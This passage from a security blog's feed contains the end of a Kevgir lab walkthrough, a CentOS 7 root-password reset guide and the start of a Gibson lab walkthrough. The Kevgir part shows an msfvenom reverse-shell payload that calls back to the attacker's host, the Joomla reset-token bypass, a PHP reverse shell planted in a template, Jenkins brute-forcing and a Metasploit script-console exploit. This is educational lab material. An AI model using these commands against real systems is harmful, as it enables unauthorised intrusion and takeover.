<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msfvenom -a x86 --platform linux -p java/jsp_shell_reverse_tcp LHOST=192.168.217.132 LPORT=8888 -f war -o runme.war
</span><span class='line'>Payload size: 1099 bytes
</span><span class='line'>Final size of war file: 1099 bytes
</span><span class='line'>Saved as: runme.war</span></code></pre></td></tr></table></div></figure>


<p>Check what&rsquo;s inside:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>jar -tf runme.war 
</span><span class='line'>WEB-INF/
</span><span class='line'>WEB-INF/web.xml
</span><span class='line'>kndeoavjwgjs.jsp</span></code></pre></td></tr></table></div></figure>


<p>I deployed it and a new folder called /runme was created on the server. With a netcat listening, I browsed to the folder and bam!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 8888
</span><span class='line'>listening on [any] 8888 ...
</span><span class='line'>connect to [192.168.217.132] from (UNKNOWN) [192.168.217.128] 37009
</span><span class='line'>whoami
</span><span class='line'>tomcat7</span></code></pre></td></tr></table></div></figure>


<p>Since I already showed earlier the method of getting root, I will stop after getting the low privilege shells.</p>

<h2>Joomla</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>8081/tcp  open  http        Apache httpd 2.4.7 ((Ubuntu))
</span><span class='line'>|_http-generator: Joomla! 1.5 - Open Source Content Management
</span><span class='line'>| http-robots.txt: 14 disallowed entries 
</span><span class='line'>| /administrator/ /cache/ /components/ /images/ 
</span><span class='line'>| /includes/ /installation/ /language/ /libraries/ /media/ 
</span><span class='line'>|_/modules/ /plugins/ /templates/ /tmp/ /xmlrpc/
</span><span class='line'>|_http-server-header: Apache/2.4.7 (Ubuntu)
</span><span class='line'>|_http-title: Welcome to the Frontpage</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/pentest/kevgir/8081.jpg" title="joomla" alt="joomla"></p>

<p>It&rsquo;s a Joomla page, so I fired up joomscan. There was a lot of output, I&rsquo;m only showing here the findings I used for exploitation:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>* The Exact version found is 1.5.1
</span><span class='line'># 15
</span><span class='line'>Info -&gt; CoreComponent: Joomla Remote Admin Password Change Vulnerability 
</span><span class='line'>Versions Affected: 1.5.5 &lt;= 
</span><span class='line'>Check: /components/com_user/controller.php
</span><span class='line'>Exploit: 1. Go to url : target.com/index.php?option=com_user&view=reset&layout=confirm  2. Write into field "token" char ' and Click OK.  3. Write new password for admin  4. Go to url : target.com/administrator/  5. Login admin with new password 
</span><span class='line'>Vulnerable? Yes</span></code></pre></td></tr></table></div></figure>


<p>This vulnerability is tracked under CVE-2008-3681:</p>

<blockquote><p>components/com_user/models/reset.php in Joomla! 1.5 through 1.5.5 does not properly validate reset tokens, which
allows remote attackers to reset the &ldquo;first enabled user (lowest id)&rdquo; password, typically for the administrator</p></blockquote>

<p>So I followed the directions and went to <a href="http://192.168.217.128:8081/index.php?option=com_user&amp;view=reset&amp;layout=confirm">http://192.168.217.128:8081/index.php?option=com_user&amp;view=reset&amp;layout=confirm</a></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/kevgir/token.jpg" title="token" alt="password reset bypass"></p>

<p>Inside the token field I put a <strong>&lsquo;</strong> and then I was taken to a password reset screen where I changed the admin password and finally logged in:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/kevgir/joomla.jpg" title="joomla" alt="joomla"></p>

<p>Inside the Extensions, there is a Template Manager page, where I selected a template and edited its HTML:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/kevgir/template.jpg" title="template" alt="joomla template"></p>

<p>I copied the source code for PentestMonkey&rsquo;s reverse PHP shell, saved the template and reloaded the main page to be served a new shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 8888
</span><span class='line'>listening on [any] 8888 ...
</span><span class='line'>connect to [192.168.217.132] from (UNKNOWN) [192.168.217.128] 57836
</span><span class='line'>Linux canyoupwnme 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux
</span><span class='line'> 19:40:29 up 39 min,  0 users,  load average: 0.15, 0.11, 0.07
</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span class='line'>/bin/sh: 0: can't access tty; job control turned off
</span><span class='line'>$ </span></code></pre></td></tr></table></div></figure>


<h2>Jenkins</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>9000/tcp  open  http        Jetty winstone-2.9
</span><span class='line'>| http-robots.txt: 1 disallowed entry 
</span><span class='line'>|_/
</span><span class='line'>|_http-server-header: Jetty(winstone-2.9)
</span><span class='line'>|_http-title: Dashboard [Jenkins]</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/pentest/kevgir/jenkins.jpg" title="jenkins" alt="jenkins dashboard"></p>

<p>Jenkins was a new target for me. Let&rsquo;s first understand what it&rsquo;s used for:</p>

<blockquote><p>Jenkins is a self-contained, open source automation server written in Java that can be used to automate all sorts of
tasks related to building, testing, and delivering or deploying software.</p></blockquote>

<p>I searched in Metasploit and found the <code>auxiliary/scanner/http/jenkins_enum</code>module:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(jenkins_enum) &gt; info
</span><span class='line'>
</span><span class='line'>       Name: Jenkins-CI Enumeration
</span><span class='line'>     Module: auxiliary/scanner/http/jenkins_enum
</span><span class='line'>    License: Metasploit Framework License (BSD)
</span><span class='line'>       Rank: Normal
</span><span class='line'>
</span><span class='line'>Provided by:
</span><span class='line'>  Jeff McCutchan
</span><span class='line'>
</span><span class='line'>Basic options:
</span><span class='line'>  Name       Current Setting  Required  Description
</span><span class='line'>  ----       ---------------  --------  -----------
</span><span class='line'>  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
</span><span class='line'>  RHOSTS                      yes       The target address range or CIDR identifier
</span><span class='line'>  RPORT      80               yes       The target port (TCP)
</span><span class='line'>  SSL        false            no        Negotiate SSL/TLS for outgoing connections
</span><span class='line'>  TARGETURI  /jenkins/        yes       The path to the Jenkins-CI application
</span><span class='line'>  THREADS    1                yes       The number of concurrent threads
</span><span class='line'>  VHOST                       no        HTTP server virtual host
</span><span class='line'>
</span><span class='line'>Description:
</span><span class='line'>  This module enumerates a remote Jenkins-CI installation in an 
</span><span class='line'>  unauthenticated manner, including host operating system and Jenkins 
</span><span class='line'>  installation details.</span></code></pre></td></tr></table></div></figure>


<p>I ran the enumeration module. Had to change the path to the root folder before I got any output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(jenkins_enum) &gt; exploit
</span><span class='line'>
</span><span class='line'>[+] 192.168.217.128:9000  - Jenkins Version 1.647
</span><span class='line'>[*] /script restricted (403)
</span><span class='line'>[*] /view/All/newJob restricted (403)
</span><span class='line'>[+] http://192.168.217.128:9000/ - /asynchPeople/ does not require authentication (200)
</span><span class='line'>[*] /systemInfo restricted (403)</span></code></pre></td></tr></table></div></figure>


<p>This information did not mean much to me, but I went to the only folder that returned a 200 code and found the usernames recognized by the server</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/kevgir/jenkins-admin.jpg" title="jenkins admin" alt="jenkins admin"></p>

<p>Knowing now there is an admin user, I went again to the bruteforce route, which was quite successful so far:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Module options (auxiliary/scanner/http/jenkins_login):
</span><span class='line'>
</span><span class='line'>   Name              Current Setting                                     Required  Description
</span><span class='line'>   ----              ---------------                                     --------  -----------
</span><span class='line'>   BLANK_PASSWORDS   false                                               no        Try blank passwords for all users
</span><span class='line'>   BRUTEFORCE_SPEED  5                                                   yes       How fast to bruteforce, from 0 to 5
</span><span class='line'>   DB_ALL_CREDS      false                                               no        Try each user/password couple stored in the current database
</span><span class='line'>   DB_ALL_PASS       false                                               no        Add all passwords in the current database to the list
</span><span class='line'>   DB_ALL_USERS      false                                               no        Add all users in the current database to the list
</span><span class='line'>   HTTP_METHOD       POST                                                yes       The HTTP method to use for the login (Accepted: GET, POST)
</span><span class='line'>   LOGIN_URL         /j_acegi_security_check                             yes       The URL that handles the login process
</span><span class='line'>   PASSWORD                                                              no        A specific password to authenticate with
</span><span class='line'>   PASS_FILE         /usr/share/wordlists/metasploit/unix_passwords.txt  no        File containing passwords, one per line
</span><span class='line'>   Proxies                                                               no        A proxy chain of format type:host:port[,type:host:port][...]
</span><span class='line'>   RHOSTS            192.168.217.128                                     yes       The target address range or CIDR identifier
</span><span class='line'>   RPORT             9000                                                yes       The target port (TCP)
</span><span class='line'>   SSL               false                                               no        Negotiate SSL/TLS for outgoing connections
</span><span class='line'>   STOP_ON_SUCCESS   true                                                yes       Stop guessing when a credential works for a host
</span><span class='line'>   THREADS           1                                                   yes       The number of concurrent threads
</span><span class='line'>   USERNAME          admin                                               no        A specific username to authenticate as
</span><span class='line'>   USERPASS_FILE                                                         no        File containing users and passwords separated by space, one pair per line
</span><span class='line'>   USER_AS_PASS      false                                               no        Try the username as the password for all users
</span><span class='line'>   USER_FILE                                                             no        File containing usernames, one per line
</span><span class='line'>   VERBOSE           true                                                yes       Whether to print output for all attempts
</span><span class='line'>   VHOST                                                                 no        HTTP server virtual host</span></code></pre></td></tr></table></div></figure>


<p>At first it didn&rsquo;t work, because I changed the login URL to correspond to the URL path. But I had to leave it as /j_acegi_security_check (I checked the source code and saw that it was correct), and then it found the credentials admin/hello:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 192.168.217.128:9000 - Login Successful: admin:hello</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>So now I was able to login and look at things and change them. Interestingly, the exploitation didn&rsquo;t stop here. There is a module that also allowed me to get a shell with the credentials:</p>

<blockquote><p>This module uses the Jenkins-CI Groovy script console to execute OS commands using Java.</p></blockquote>

<p>Don&rsquo;t forget to select the target as Linux:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>options
</span><span class='line'>
</span><span class='line'>Module options (exploit/multi/http/jenkins_script_console):
</span><span class='line'>
</span><span class='line'>   Name       Current Setting  Required  Description
</span><span class='line'>   ----       ---------------  --------  -----------
</span><span class='line'>   API_TOKEN                   no        The API token for the specified username
</span><span class='line'>   PASSWORD   hello            no        The password for the specified username
</span><span class='line'>   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
</span><span class='line'>   RHOST      192.168.217.128  yes       The target address
</span><span class='line'>   RPORT      9000             yes       The target port (TCP)
</span><span class='line'>   SRVHOST    192.168.217.132  yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
</span><span class='line'>   SRVPORT    8080             yes       The local port to listen on.
</span><span class='line'>   SSL        false            no        Negotiate SSL/TLS for outgoing connections
</span><span class='line'>   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
</span><span class='line'>   TARGETURI  /                yes       The path to the Jenkins-CI application
</span><span class='line'>   URIPATH                     no        The URI to use for this exploit (default is random)
</span><span class='line'>   USERNAME   admin            no        The username to authenticate as
</span><span class='line'>   VHOST                       no        HTTP server virtual host
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options (linux/x86/meterpreter/reverse_tcp):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   LHOST  192.168.217.132  yes       The listen address
</span><span class='line'>   LPORT  8080             yes       The listen port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   1   Linux</span></code></pre></td></tr></table></div></figure>


<p>And a new shell appears!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(jenkins_script_console) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse TCP handler on 192.168.217.132:8080 
</span><span class='line'>[*] Checking access to the script console
</span><span class='line'>[*] Logging in...
</span><span class='line'>[*] 192.168.217.128:9000 - Sending Linux stager...
</span><span class='line'>[*] Sending stage (849108 bytes) to 192.168.217.128
</span><span class='line'>[*] Meterpreter session 1 opened (192.168.217.132:8080 -&gt; 192.168.217.128:48103) at 2017-12-12 12:49:19 -0500
</span><span class='line'>
</span><span class='line'>meterpreter &gt; 
</span><span class='line'>[!] Deleting /tmp/wE472W payload file</span></code></pre></td></tr></table></div></figure>


<p>Lastly, there were some other open ports, but I couldn&rsquo;t use them for exploitation.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>46201/tcp open  unknown
</span><span class='line'>| fingerprint-strings: 
</span><span class='line'>|   DNSStatusRequest: 
</span><span class='line'>|     Unrecognized protocol:
</span><span class='line'>|   DNSVersionBindReq: 
</span><span class='line'>|     Unrecognized protocol: 
</span><span class='line'>|     version
</span><span class='line'>|_    bind
</span><span class='line'>53180/tcp open  ssh         Apache Mina sshd 0.8.0 (protocol 2.0)
</span><span class='line'>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span><span class='line'>SF-Port46201-TCP:V=7.60%I=7%D=12/2%Time=5A22FB7C%P=x86_64-pc-linux-gnu%r(D
</span><span class='line'>SF:NSVersionBindReq,36,"Unrecognized\x20protocol:\x20\0\x06\x01\0\0\x01\0\
</span><span class='line'>SF:0\0\0\0\0\x07version\x04bind\0\0\x10\0\x03\n")%r(DNSStatusRequest,24,"U
</span><span class='line'>SF:nrecognized\x20protocol:\x20\0\0\x10\0\0\0\0\0\0\0\0\0\n");</span></code></pre></td></tr></table></div></figure>


<p>Interestingly, it was the first time I encountered Apache Mina, so this was a good occasion to learn more about it:</p>

<blockquote><p>Apache MINA is a network application framework which helps users develop high performance and high scalability
network applications easily. It provides an abstract event-driven asynchronous API over various transports such as
TCP/IP and UDP/IP via Java NIO.</p></blockquote>

<p>Well, this was fun box and I learned a lot from it. The bruteforce exercises were interesting, because I could familiarize myself with tools I hadn&rsquo;t used before, like patator and fcrackzip. Rest of the web application vulnerabilities were pretty straightforward, but I liked the Jenkins and Redis ones, which were something fresher than the usual Apache/PHP app challenges. All in all, a great machine to learn more about web app security, and one I strongly recommend.</p>

<h3>Learn more</h3>

<p>Redis security: <a href="http://antirez.com/news/96">http://antirez.com/news/96</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _______________________________________
</span><span class='line'>/ This will be a memorable month -- no  \
</span><span class='line'>\ matter how hard you try to forget it. /
</span><span class='line'> ---------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Resetting root password on CentOS 7]]></title>
    <link href="http://chousensha.github.io/blog/2017/11/11/lfcs-prep-resetting-root-password-on-centos-7/"/>
    <updated>2017-11-11T16:53:18-05:00</updated>
    <id>http://chousensha.github.io/blog/2017/11/11/lfcs-prep-resetting-root-password-on-centos-7</id>
    <content type="html"><![CDATA[<p>So, you got physical access to a machine, but you don&rsquo;t remember (or never knew) the root password. This post will walk you through how to reset the root password on a CentOS 7 system.</p>

<!-- more -->


<p><img class="center" src="http://chousensha.github.io/images/sysadmin/rootreset/boot.png" title="boot" alt="edit grub boot entry"></p>

<p>At the boot menu, press <strong>e</strong> to edit the desired boot entry</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/rootreset/initram.png" title="initram" alt="initram"></p>

<p>Now go to the end of the line that starts with <strong>linux16</strong> (you can quickly do it with <strong>Ctrl-e</strong> or <strong>End</strong> key, <strong>Ctrl-a</strong> or <strong>Home</strong> for the beginning of a line) and add <code>rd.break enforcing=0</code> to it. The first paramenter will interrupt the boot process to drop into a shell, and the second one sets SELinux to permissive mode, needed for a quicker way of resetting the password that doesn&rsquo;t require file relabeling at the end.</p>

<p>Also remove the <strong>rhgb</strong> and <strong>quiet</strong> parameters to see more debugging information. These are described in <a href="https://www.redhat.com/archives/rhl-list/2004-May/msg07775.html">https://www.redhat.com/archives/rhl-list/2004-May/msg07775.html</a></p>

<blockquote><p>rhgb = redhat graphical boot &ndash; This is a GUI mode booting screen with most of the information hidden while the user
sees a rotating activity icon spining and brief information as to what the computer is doing.</p>

<p>quiet = hides the majority of boot messages before rhgb starts. These are supposed to make the common user more
comfortable. They get alarmed about seeing the kernel and initializing messages, so they hide them for their comfort.</p></blockquote>

<p>Next, press <strong>Ctrl-x</strong> to boot with the new options. You will be dropped into an initramfs switch_root shell.</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/rootreset/initramfs.png" title="initramfs switch_root" alt="initramfs switch_root shell"></p>

<p>This could be confusing to someone new. Basically, initramfs is a temporary filesystem loaded into memory, that the kernel can access really early, in order to offload some startup tasks. It is also called early user space, and it takes care of steps that would be too cumbersome to include in the kernel, such as loading kernel modules and drivers needed for boot. This allows the kernel to remain relatively lean and not do by itself all the possible configurations. This initramfs image is a CPIO archive that gets unpacked into a tmpfs (a temporary filesystem stored in memory) and becomes the initial root filesystem.</p>

<p>Now, the filesystem is already mounted read-only inside <code>/sysroot</code>. To makey any changes, you have to mount it as read-write: <code>mount -o remount,rw /sysroot</code></p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/rootreset/sysroot.png" title="sysroot" alt="sysroot mount"></p>

<p>Finally, change the root directory to /sysroot in order to run a shell from it: <code>chroot /sysroot</code>. Now your prompt will change to <code>sh-4.2#</code> and from here you can change the password normally, by using <em>passwd</em>. You should get the message that all authentication tokens updated successfully. Since you updated the password, you changed <em>/etc/shadow</em> and now it won&rsquo;t be labeled correctly with a SELinux security context. You have to force a relabel of all the files at next boot, by creating an <em>.autorelabel</em> file: <code>touch /.autorelabel</code>.</p>

<p>Now type exit twice to exit the chroot environment first and then to exit the initramfs shell which will cause a reboot. The relabeling will take a while, and then you can use the system.</p>

<p>To skip the relabeling process, if you used <em>enforce=0</em>, you can restore the context of the shadow file with <code>restorecon /etc/shadow</code>. Then you have to remember to set SELinux back to enforcing, by running <code>setenforce 1</code></p>

<p>Apparently, when you have an RHCSA exam, you start from getting a machine that you have to reset the root password for, which is really cool. Don&rsquo;t get caught unprepared!</p>

<h3>Learn more</h3>

<p><a href="https://www.certdepot.net/rhel7-interrupt-boot-gain-access-system/">https://www.certdepot.net/rhel7-interrupt-boot-gain-access-system/</a></p>

<p><a href="http://man7.org/linux/man-pages/man7/dracut.cmdline.7.html">Kernel command line parameters</a></p>

<p><a href="https://unix.stackexchange.com/questions/126217/when-would-you-use-pivot-root-over-switch-root">switch_root and initramfs</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _________________________________________
</span><span class='line'>/ Be careful of reading health books, you \
</span><span class='line'>| might die of a misprint.                |
</span><span class='line'>|                                         |
</span><span class='line'>\ -- Mark Twain                           /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Gibson 0.2 walkthrough]]></title>
    <link href="http://chousensha.github.io/blog/2017/10/28/gibson-0-dot-2-walkthrough/"/>
    <updated>2017-10-28T16:10:23-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/10/28/gibson-0-dot-2-walkthrough</id>
    <content type="html"><![CDATA[<p>The Vulnhub machine I picked for today&rsquo;s target is called Gibson. For this challenge, there are also some hints:</p>

<ul>
<li>SSH can forward X11.</li>
<li>The challenge isn&rsquo;t over with root. The flag is not where you expect to find it.</li>
</ul>


<p>Let&rsquo;s see what Gibson has in store for us!</p>

<!-- more -->


<h2>Recon</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   1024 fb:f6:d1:57:64:fa:38:66:2d:66:40:12:a4:2f:75:b4 (DSA)
</span><span class='line'>|   2048 32:13:58:ae:32:b0:5d:b9:2a:9c:87:9c:ae:79:3b:2e (RSA)
</span><span class='line'>|_  256 3f:dc:7d:94:2f:86:f1:83:41:db:8c:74:52:f0:49:43 (ECDSA)
</span><span class='line'>80/tcp open  http    Apache httpd 2.4.7
</span><span class='line'>| http-ls: Volume /
</span><span class='line'>| SIZE  TIME              FILENAME
</span><span class='line'>| 273   2016-05-07 13:03  davinci.html
</span><span class='line'>|_
</span><span class='line'>|_http-server-header: Apache/2.4.7 (Ubuntu)
</span><span class='line'>|_http-title: Index of /</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>Looks like we only have SSH and a web server running on this box. The Gibson Mining Corporation page contains a  davinci.html file with a bolded message: <code>The answer you seek will be found by brute force</code>. And the page source also has an interesting comment:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!-- Damn it Margo! Stop setting your password to "god" --&gt;
</span><span class='line'>&lt;!-- at least try and use a different one of the 4 most --&gt;
</span><span class='line'>&lt;!-- common ones! (eugene) --&gt;</span></code></pre></td></tr></table></div></figure>


<p>With this information in hand, I tried SSH&#8217;ing as Margo with password god. That didn&rsquo;t work, but doing it as margo instead got me in. We have a shell on the box already!</p>

<h2>Privilege escalation</h2>

<p>We&rsquo;re in as margo, but we need root. I ran my <a href="https://github.com/chousensha/linux_privcheck">linux_pricheck script</a> and sifted through the output to see what might be helpful. Some of the discoveries:</p>

<ul>
<li>there is a network interface connected to a different subnet:</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>virbr0    Link encap:Ethernet  HWaddr fe:54:00:72:e2:fb  
</span><span class='line'>          inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0
</span><span class='line'>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
</span><span class='line'>          RX packets:7 errors:0 dropped:0 overruns:0 frame:0
</span><span class='line'>          TX packets:17 errors:0 dropped:0 overruns:0 carrier:0
</span><span class='line'>          collisions:0 txqueuelen:0 
</span><span class='line'>          RX bytes:1347 (1.3 KB)  TX bytes:2459 (2.4 KB)</span></code></pre></td></tr></table></div></figure>


<ul>
